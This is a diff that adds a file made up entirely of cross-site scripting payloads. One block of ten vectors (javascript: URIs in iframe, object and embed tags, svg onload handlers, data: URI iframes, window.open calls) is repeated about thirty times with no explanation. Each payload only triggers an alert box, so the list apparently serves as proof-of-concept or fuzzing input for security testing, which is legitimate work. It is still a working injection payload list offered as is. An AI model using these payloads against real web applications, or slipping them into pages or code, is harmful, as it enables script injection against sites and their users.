@@ -1,0 +1,329 @@
+<iframe src="javascript:alert('UXSS')"></iframe>
+<object data="javascript:alert('UXSS')"></object>
+<embed src="javascript:alert('UXSS')"></embed>
+<svg><script>alert('UXSS')</script></svg>
+<svg onload=alert('UXSS')></svg>
+<iframe src="data:text/html,<svg onload=alert('UXSS')>"></iframe>
+<svg><a href="javascript:alert('UXSS')">CLICK</a></svg>
+<iframe src="javascript:alert('UXSS')" onload=alert('UXSS')></iframe>
+<script>window.open('javascript:alert("UXSS")')</script>
+<img src=x onerror="window.open('javascript:alert(1)')">
+
+<iframe src="javascript:alert('UXSS')"></iframe>
+<object data="javascript:alert('UXSS')"></object>
+<embed src="javascript:alert('UXSS')"></embed>
+<svg><script>alert('UXSS')</script></svg>
+<svg onload=alert('UXSS')></svg>
+<iframe src="data:text/html,<svg onload=alert('UXSS')>"></iframe>
+<svg><a href="javascript:alert('UXSS')">CLICK</a></svg>
+<iframe src="javascript:alert('UXSS')" onload=alert('UXSS')></iframe>
+<script>window.open('javascript:alert("UXSS")')</script>
+<img src=x onerror="window.open('javascript:alert(1)')">
+
+<iframe src="javascript:alert('UXSS')"></iframe>
+<object data="javascript:alert('UXSS')"></object>
+<embed src="javascript:alert('UXSS')"></embed>
+<svg><script>alert('UXSS')</script></svg>
+<svg onload=alert('UXSS')></svg>
+<iframe src="data:text/html,<svg onload=alert('UXSS')>"></iframe>
+<svg><a href="javascript:alert('UXSS')">CLICK</a></svg>
+<iframe src="javascript:alert('UXSS')" onload=alert('UXSS')></iframe>
+<script>window.open('javascript:alert("UXSS")')</script>
+<img src=x onerror="window.open('javascript:alert(1)')">
+
+<iframe src="javascript:alert('UXSS')"></iframe>
+<object data="javascript:alert('UXSS')"></object>
+<embed src="javascript:alert('UXSS')"></embed>
+<svg><script>alert('UXSS')</script></svg>
+<svg onload=alert('UXSS')></svg>
+<iframe src="data:text/html,<svg onload=alert('UXSS')>"></iframe>
+<svg><a href="javascript:alert('UXSS')">CLICK</a></svg>
+<iframe src="javascript:alert('UXSS')" onload=alert('UXSS')></iframe>
+<script>window.open('javascript:alert("UXSS")')</script>
+<img src=x onerror="window.open('javascript:alert(1)')">
+
+<iframe src="javascript:alert('UXSS')"></iframe>
+<object data="javascript:alert('UXSS')"></object>
+<embed src="javascript:alert('UXSS')"></embed>
+<svg><script>alert('UXSS')</script></svg>
+<svg onload=alert('UXSS')></svg>
+<iframe src="data:text/html,<svg onload=alert('UXSS')>"></iframe>
+<svg><a href="javascript:alert('UXSS')">CLICK</a></svg>
+<iframe src="javascript:alert('UXSS')" onload=alert('UXSS')></iframe>
+<script>window.open('javascript:alert("UXSS")')</script>
+<img src=x onerror="window.open('javascript:alert(1)')">
+
+<iframe src="javascript:alert('UXSS')"></iframe>
+<object data="javascript:alert('UXSS')"></object>
+<embed src="javascript:alert('UXSS')"></embed>
+<svg><script>alert('UXSS')</script></svg>
+<svg onload=alert('UXSS')></svg>
+<iframe src="data:text/html,<svg onload=alert('UXSS')>"></iframe>
+<svg><a href="javascript:alert('UXSS')">CLICK</a></svg>
+<iframe src="javascript:alert('UXSS')" onload=alert('UXSS')></iframe>
+<script>window.open('javascript:alert("UXSS")')</script>
+<img src=x onerror="window.open('javascript:alert(1)')">
+
+<iframe src="javascript:alert('UXSS')"></iframe>
+<object data="javascript:alert('UXSS')"></object>
+<embed src="javascript:alert('UXSS')"></embed>
+<svg><script>alert('UXSS')</script></svg>
+<svg onload=alert('UXSS')></svg>
+<iframe src="data:text/html,<svg onload=alert('UXSS')>"></iframe>
+<svg><a href="javascript:alert('UXSS')">CLICK</a></svg>
+<iframe src="javascript:alert('UXSS')" onload=alert('UXSS')></iframe>
+<script>window.open('javascript:alert("UXSS")')</script>
+<img src=x onerror="window.open('javascript:alert(1)')">
+
+<iframe src="javascript:alert('UXSS')"></iframe>
+<object data="javascript:alert('UXSS')"></object>
+<embed src="javascript:alert('UXSS')"></embed>
+<svg><script>alert('UXSS')</script></svg>
+<svg onload=alert('UXSS')></svg>
+<iframe src="data:text/html,<svg onload=alert('UXSS')>"></iframe>
+<svg><a href="javascript:alert('UXSS')">CLICK</a></svg>
+<iframe src="javascript:alert('UXSS')" onload=alert('UXSS')></iframe>
+<script>window.open('javascript:alert("UXSS")')</script>
+<img src=x onerror="window.open('javascript:alert(1)')">
+
+<iframe src="javascript:alert('UXSS')"></iframe>
+<object data="javascript:alert('UXSS')"></object>
+<embed src="javascript:alert('UXSS')"></embed>
+<svg><script>alert('UXSS')</script></svg>
+<svg onload=alert('UXSS')></svg>
+<iframe src="data:text/html,<svg onload=alert('UXSS')>"></iframe>
+<svg><a href="javascript:alert('UXSS')">CLICK</a></svg>
+<iframe src="javascript:alert('UXSS')" onload=alert('UXSS')></iframe>
+<script>window.open('javascript:alert("UXSS")')</script>
+<img src=x onerror="window.open('javascript:alert(1)')">
+
+<iframe src="javascript:alert('UXSS')"></iframe>
+<object data="javascript:alert('UXSS')"></object>
+<embed src="javascript:alert('UXSS')"></embed>
+<svg><script>alert('UXSS')</script></svg>
+<svg onload=alert('UXSS')></svg>
+<iframe src="data:text/html,<svg onload=alert('UXSS')>"></iframe>
+<svg><a href="javascript:alert('UXSS')">CLICK</a></svg>
+<iframe src="javascript:alert('UXSS')" onload=alert('UXSS')></iframe>
+<script>window.open('javascript:alert("UXSS")')</script>
+<img src=x onerror="window.open('javascript:alert(1)')">
+
+<iframe src="javascript:alert('UXSS')"></iframe>
+<object data="javascript:alert('UXSS')"></object>
+<embed src="javascript:alert('UXSS')"></embed>
+<svg><script>alert('UXSS')</script></svg>
+<svg onload=alert('UXSS')></svg>
+<iframe src="data:text/html,<svg onload=alert('UXSS')>"></iframe>
+<svg><a href="javascript:alert('UXSS')">CLICK</a></svg>
+<iframe src="javascript:alert('UXSS')" onload=alert('UXSS')></iframe>
+<script>window.open('javascript:alert("UXSS")')</script>
+<img src=x onerror="window.open('javascript:alert(1)')">
+
+<iframe src="javascript:alert('UXSS')"></iframe>
+<object data="javascript:alert('UXSS')"></object>
+<embed src="javascript:alert('UXSS')"></embed>
+<svg><script>alert('UXSS')</script></svg>
+<svg onload=alert('UXSS')></svg>
+<iframe src="data:text/html,<svg onload=alert('UXSS')>"></iframe>
+<svg><a href="javascript:alert('UXSS')">CLICK</a></svg>
+<iframe src="javascript:alert('UXSS')" onload=alert('UXSS')></iframe>
+<script>window.open('javascript:alert("UXSS")')</script>
+<img src=x onerror="window.open('javascript:alert(1)')">
+
+<iframe src="javascript:alert('UXSS')"></iframe>
+<object data="javascript:alert('UXSS')"></object>
+<embed src="javascript:alert('UXSS')"></embed>
+<svg><script>alert('UXSS')</script></svg>
+<svg onload=alert('UXSS')></svg>
+<iframe src="data:text/html,<svg onload=alert('UXSS')>"></iframe>
+<svg><a href="javascript:alert('UXSS')">CLICK</a></svg>
+<iframe src="javascript:alert('UXSS')" onload=alert('UXSS')></iframe>
+<script>window.open('javascript:alert("UXSS")')</script>
+<img src=x onerror="window.open('javascript:alert(1)')">
+
+<iframe src="javascript:alert('UXSS')"></iframe>
+<object data="javascript:alert('UXSS')"></object>
+<embed src="javascript:alert('UXSS')"></embed>
+<svg><script>alert('UXSS')</script></svg>
+<svg onload=alert('UXSS')></svg>
+<iframe src="data:text/html,<svg onload=alert('UXSS')>"></iframe>
+<svg><a href="javascript:alert('UXSS')">CLICK</a></svg>
+<iframe src="javascript:alert('UXSS')" onload=alert('UXSS')></iframe>
+<script>window.open('javascript:alert("UXSS")')</script>
+<img src=x onerror="window.open('javascript:alert(1)')">
+
+<iframe src="javascript:alert('UXSS')"></iframe>
+<object data="javascript:alert('UXSS')"></object>
+<embed src="javascript:alert('UXSS')"></embed>
+<svg><script>alert('UXSS')</script></svg>
+<svg onload=alert('UXSS')></svg>
+<iframe src="data:text/html,<svg onload=alert('UXSS')>"></iframe>
+<svg><a href="javascript:alert('UXSS')">CLICK</a></svg>
+<iframe src="javascript:alert('UXSS')" onload=alert('UXSS')></iframe>
+<script>window.open('javascript:alert("UXSS")')</script>
+<img src=x onerror="window.open('javascript:alert(1)')">
+
+<iframe src="javascript:alert('UXSS')"></iframe>
+<object data="javascript:alert('UXSS')"></object>
+<embed src="javascript:alert('UXSS')"></embed>
+<svg><script>alert('UXSS')</script></svg>
+<svg onload=alert('UXSS')></svg>
+<iframe src="data:text/html,<svg onload=alert('UXSS')>"></iframe>
+<svg><a href="javascript:alert('UXSS')">CLICK</a></svg>
+<iframe src="javascript:alert('UXSS')" onload=alert('UXSS')></iframe>
+<script>window.open('javascript:alert("UXSS")')</script>
+<img src=x onerror="window.open('javascript:alert(1)')">
+
+<iframe src="javascript:alert('UXSS')"></iframe>
+<object data="javascript:alert('UXSS')"></object>
+<embed src="javascript:alert('UXSS')"></embed>
+<svg><script>alert('UXSS')</script></svg>
+<svg onload=alert('UXSS')></svg>
+<iframe src="data:text/html,<svg onload=alert('UXSS')>"></iframe>
+<svg><a href="javascript:alert('UXSS')">CLICK</a></svg>
+<iframe src="javascript:alert('UXSS')" onload=alert('UXSS')></iframe>
+<script>window.open('javascript:alert("UXSS")')</script>
+<img src=x onerror="window.open('javascript:alert(1)')">
+
+<iframe src="javascript:alert('UXSS')"></iframe>
+<object data="javascript:alert('UXSS')"></object>
+<embed src="javascript:alert('UXSS')"></embed>
+<svg><script>alert('UXSS')</script></svg>
+<svg onload=alert('UXSS')></svg>
+<iframe src="data:text/html,<svg onload=alert('UXSS')>"></iframe>
+<svg><a href="javascript:alert('UXSS')">CLICK</a></svg>
+<iframe src="javascript:alert('UXSS')" onload=alert('UXSS')></iframe>
+<script>window.open('javascript:alert("UXSS")')</script>
+<img src=x onerror="window.open('javascript:alert(1)')">
+
+<iframe src="javascript:alert('UXSS')"></iframe>
+<object data="javascript:alert('UXSS')"></object>
+<embed src="javascript:alert('UXSS')"></embed>
+<svg><script>alert('UXSS')</script></svg>
+<svg onload=alert('UXSS')></svg>
+<iframe src="data:text/html,<svg onload=alert('UXSS')>"></iframe>
+<svg><a href="javascript:alert('UXSS')">CLICK</a></svg>
+<iframe src="javascript:alert('UXSS')" onload=alert('UXSS')></iframe>
+<script>window.open('javascript:alert("UXSS")')</script>
+<img src=x onerror="window.open('javascript:alert(1)')">
+
+<iframe src="javascript:alert('UXSS')"></iframe>
+<object data="javascript:alert('UXSS')"></object>
+<embed src="javascript:alert('UXSS')"></embed>
+<svg><script>alert('UXSS')</script></svg>
+<svg onload=alert('UXSS')></svg>
+<iframe src="data:text/html,<svg onload=alert('UXSS')>"></iframe>
+<svg><a href="javascript:alert('UXSS')">CLICK</a></svg>
+<iframe src="javascript:alert('UXSS')" onload=alert('UXSS')></iframe>
+<script>window.open('javascript:alert("UXSS")')</script>
+<img src=x onerror="window.open('javascript:alert(1)')">
+
+<iframe src="javascript:alert('UXSS')"></iframe>
+<object data="javascript:alert('UXSS')"></object>
+<embed src="javascript:alert('UXSS')"></embed>
+<svg><script>alert('UXSS')</script></svg>
+<svg onload=alert('UXSS')></svg>
+<iframe src="data:text/html,<svg onload=alert('UXSS')>"></iframe>
+<svg><a href="javascript:alert('UXSS')">CLICK</a></svg>
+<iframe src="javascript:alert('UXSS')" onload=alert('UXSS')></iframe>
+<script>window.open('javascript:alert("UXSS")')</script>
+<img src=x onerror="window.open('javascript:alert(1)')">
+
+<iframe src="javascript:alert('UXSS')"></iframe>
+<object data="javascript:alert('UXSS')"></object>
+<embed src="javascript:alert('UXSS')"></embed>
+<svg><script>alert('UXSS')</script></svg>
+<svg onload=alert('UXSS')></svg>
+<iframe src="data:text/html,<svg onload=alert('UXSS')>"></iframe>
+<svg><a href="javascript:alert('UXSS')">CLICK</a></svg>
+<iframe src="javascript:alert('UXSS')" onload=alert('UXSS')></iframe>
+<script>window.open('javascript:alert("UXSS")')</script>
+<img src=x onerror="window.open('javascript:alert(1)')">
+
+<iframe src="javascript:alert('UXSS')"></iframe>
+<object data="javascript:alert('UXSS')"></object>
+<embed src="javascript:alert('UXSS')"></embed>
+<svg><script>alert('UXSS')</script></svg>
+<svg onload=alert('UXSS')></svg>
+<iframe src="data:text/html,<svg onload=alert('UXSS')>"></iframe>
+<svg><a href="javascript:alert('UXSS')">CLICK</a></svg>
+<iframe src="javascript:alert('UXSS')" onload=alert('UXSS')></iframe>
+<script>window.open('javascript:alert("UXSS")')</script>
+<img src=x onerror="window.open('javascript:alert(1)')">
+
+<iframe src="javascript:alert('UXSS')"></iframe>
+<object data="javascript:alert('UXSS')"></object>
+<embed src="javascript:alert('UXSS')"></embed>
+<svg><script>alert('UXSS')</script></svg>
+<svg onload=alert('UXSS')></svg>
+<iframe src="data:text/html,<svg onload=alert('UXSS')>"></iframe>
+<svg><a href="javascript:alert('UXSS')">CLICK</a></svg>
+<iframe src="javascript:alert('UXSS')" onload=alert('UXSS')></iframe>
+<script>window.open('javascript:alert("UXSS")')</script>
+<img src=x onerror="window.open('javascript:alert(1)')">
+
+<iframe src="javascript:alert('UXSS')"></iframe>
+<object data="javascript:alert('UXSS')"></object>
+<embed src="javascript:alert('UXSS')"></embed>
+<svg><script>alert('UXSS')</script></svg>
+<svg onload=alert('UXSS')></svg>
+<iframe src="data:text/html,<svg onload=alert('UXSS')>"></iframe>
+<svg><a href="javascript:alert('UXSS')">CLICK</a></svg>
+<iframe src="javascript:alert('UXSS')" onload=alert('UXSS')></iframe>
+<script>window.open('javascript:alert("UXSS")')</script>
+<img src=x onerror="window.open('javascript:alert(1)')">
+
+<iframe src="javascript:alert('UXSS')"></iframe>
+<object data="javascript:alert('UXSS')"></object>
+<embed src="javascript:alert('UXSS')"></embed>
+<svg><script>alert('UXSS')</script></svg>
+<svg onload=alert('UXSS')></svg>
+<iframe src="data:text/html,<svg onload=alert('UXSS')>"></iframe>
+<svg><a href="javascript:alert('UXSS')">CLICK</a></svg>
+<iframe src="javascript:alert('UXSS')" onload=alert('UXSS')></iframe>
+<script>window.open('javascript:alert("UXSS")')</script>
+<img src=x onerror="window.open('javascript:alert(1)')">
+
+<iframe src="javascript:alert('UXSS')"></iframe>
+<object data="javascript:alert('UXSS')"></object>
+<embed src="javascript:alert('UXSS')"></embed>
+<svg><script>alert('UXSS')</script></svg>
+<svg onload=alert('UXSS')></svg>
+<iframe src="data:text/html,<svg onload=alert('UXSS')>"></iframe>
+<svg><a href="javascript:alert('UXSS')">CLICK</a></svg>
+<iframe src="javascript:alert('UXSS')" onload=alert('UXSS')></iframe>
+<script>window.open('javascript:alert("UXSS")')</script>
+<img src=x onerror="window.open('javascript:alert(1)')">
+
+<iframe src="javascript:alert('UXSS')"></iframe>
+<object data="javascript:alert('UXSS')"></object>
+<embed src="javascript:alert('UXSS')"></embed>
+<svg><script>alert('UXSS')</script></svg>
+<svg onload=alert('UXSS')></svg>
+<iframe src="data:text/html,<svg onload=alert('UXSS')>"></iframe>
+<svg><a href="javascript:alert('UXSS')">CLICK</a></svg>
+<iframe src="javascript:alert('UXSS')" onload=alert('UXSS')></iframe>
+<script>window.open('javascript:alert("UXSS")')</script>
+<img src=x onerror="window.open('javascript:alert(1)')">
+
+<iframe src="javascript:alert('UXSS')"></iframe>
+<object data="javascript:alert('UXSS')"></object>
+<embed src="javascript:alert('UXSS')"></embed>
+<svg><script>alert('UXSS')</script></svg>
+<svg onload=alert('UXSS')></svg>
+<iframe src="data:text/html,<svg onload=alert('UXSS')>"></iframe>
+<svg><a href="javascript:alert('UXSS')">CLICK</a></svg>
+<iframe src="javascript:alert('UXSS')" onload=alert('UXSS')></iframe>
+<script>window.open('javascript:alert("UXSS")')</script>
+<img src=x onerror="window.open('javascript:alert(1)')">
+
+<iframe src="javascript:alert('UXSS')"></iframe>
+<object data="javascript:alert('UXSS')"></object>
+<embed src="javascript:alert('UXSS')"></embed>
+<svg><script>alert('UXSS')</script></svg>
+<svg onload=alert('UXSS')></svg>
+<iframe src="data:text/html,<svg onload=alert('UXSS')>"></iframe>
+<svg><a href="javascript:alert('UXSS')">CLICK</a></svg>
+<iframe src="javascript:alert('UXSS')" onload=alert('UXSS')></iframe>
+<script>window.open('javascript:alert("UXSS")')</script>
+<img src=x onerror="window.open('javascript:alert(1)')">
